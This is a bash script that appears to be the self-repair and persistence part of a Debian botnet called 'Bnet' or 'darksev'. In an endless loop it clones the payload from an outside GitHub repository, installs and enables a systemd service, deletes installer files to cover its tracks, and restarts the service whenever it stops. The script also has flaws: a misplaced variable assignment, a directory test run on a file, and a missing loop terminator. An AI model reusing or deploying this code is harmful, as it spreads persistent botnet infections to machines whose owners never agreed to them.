#Har har Mahadev
#!/bin/bash


# Folder check
fileee="/usr/share/Bnet/recover_bnet.sh"

while true; do
    if [ ! -f "$fileee" ]; then
       
        git clone https://github.com/Dhanraj369/the_spider_shell_reshell
        cp -r the_spider_shell_reshell/Debian_based_botne/Bnet /var/run/
        rm -rf the_spider_shell_reshell
        cp /var/run/Bnet/darksev.service /etc/systemd/system/
        rm /var/run/Bnet/darksev.service
        #  Debian_based_botne
        cd /var/run/Bnet/ && chmod +x *.sh
        systemctl daemon-reload
        systemctl enable darksev.service
        systemctl start darksev.service
        systemctl daemon-reload
        cd /var/run/Bnet/ && rm botnet.service install.sh recover_bnet.sh botnet.service run_me.sh
        cd /var/run/Bnet/ && rm upower.service
    

    fi

    sleep 5 

    # botnet.service check
    service_name="darksev.service"

    if ! systemctl is-active --quiet "$service_name"; then

        systemctl daemon-reload
        systemctl enable darksev.service
        systemctl start darksev.service

    serv_file="/etc/systemd/system/darksev.service"
    elif [[ ! -d "$serv_file" ]]; then
        
        systemctl daemon-reload
        cp /var/run/Bnet/darksev.service /etc/systemd/system/
        systemctl enable darksev.service
        systemctl start darksev.service 
        systemctl daemon-reload


    fi

    sleep 5  
